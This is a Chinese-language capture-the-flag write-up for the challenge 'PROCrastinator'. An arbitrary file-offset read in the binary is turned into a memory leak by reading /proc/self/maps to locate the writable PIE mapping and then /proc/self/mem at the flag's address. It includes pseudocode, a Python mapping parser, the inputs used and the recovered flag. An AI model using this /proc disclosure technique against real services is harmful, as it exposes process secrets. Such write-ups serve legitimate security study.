# PROCrastinator

## 题目简述

目标是 x86-64 PIE，NX 开启、无 Canary。程序菜单提供一个“按十六进制 offset 从任意文件读取最多 `0x3ff` 字节并按字符串打印”的功能，却没有限制 `/proc` 伪文件系统。flag 作为全局数组位于 PIE 的 `.data` 段；利用 `/proc/self/maps` 泄露当前进程映射，再读 `/proc/self/mem` 的对应虚拟地址即可直接取出。

## 解题过程

### 确认任意文件偏移读取原语

公开仓库没有 C 源码，但二进制保留符号。对 `read_from_file` 的只读反汇编可还原出以下流程：

```c
scanf("%255s", filename);
scanf("%lx", &offset);
fd = open(filename, O_RDONLY);
lseek(fd, offset, SEEK_SET);
n = read(fd, buffer, 0x3ff);
buffer[n] = '\0';
printf("File contents:\n%s", buffer);
```

这不是内存破坏，而是文件访问边界缺失。由于服务在 Linux 上运行，`/proc/self/maps` 和 `/proc/self/mem` 都代表当前进程本身，普通进程通常可以读取自己的这些接口。

### 由 maps 计算 flag 地址

第一次选择读取功能：

```text
filename = /proc/self/maps
offset   = 0
```

在返回的映射中找到目标 ELF 自身的 `rw-p` 行，而不是依赖固定行号。例如：

```text
555555558000-555555559000 rw-p 00003000 ... /challenge/chall
```

ELF 符号表显示 `flag` 的相对虚拟地址为 `0x4080`，可写映射从 PIE 基址加 `0x4000` 开始，因此 flag 位于该 `rw-p` 映射起点后 `0x80`：

$$
\text{flag\_addr}=\text{rw\_mapping\_start}+0x80.
$$

官方 solver 直接取预期 maps 行并加 `128`，更稳健的实现应按权限与路径解析：

```python
def find_rw_start(maps_blob):
    for line in maps_blob.splitlines():
        fields = line.split()
        if len(fields) >= 6 and fields[1].startswith(b"rw"):
            if fields[-1].endswith(b"/chall"):
                return int(fields[0].split(b"-")[0], 16)
    raise RuntimeError("writable ELF mapping not found")

flag_addr = find_rw_start(maps_blob) + 0x80
```

第二次读取：

```text
filename = /proc/self/mem
offset   = <flag_addr 的十六进制值>
```

`lseek` 会把文件位置解释为进程虚拟地址，随后的 `read` 从 `.data` 中取出以 NUL 结尾的 flag。恢复结果为：

```text
shellmates{now_w3_N0W_wHat_/PrOc_DIReCt0RY_1$_f0R}
```

仓库内的 challenge binary 本身包含这段 `.data`，所以离线 `strings` 也能看到它；远程题的决定性利用仍是通过程序允许的文件读取接口访问 `/proc/self/maps` 与 `/proc/self/mem`。

## 方法总结

- 核心技巧：把任意文件读取扩展到 `/proc`，先泄露 PIE 映射，再按虚拟地址读取进程内存中的全局秘密。
- 识别信号：程序允许用户指定 Linux 文件路径和 seek offset，题名又强调 `PROc` 时，应检查 `self/maps`、`self/mem`、`self/environ`、`self/fd` 等接口。
- 复用要点：不要硬编码 maps 的第几行；应按目标路径、权限和文件偏移解析映射，并用 ELF 符号 RVA 计算段内偏移。
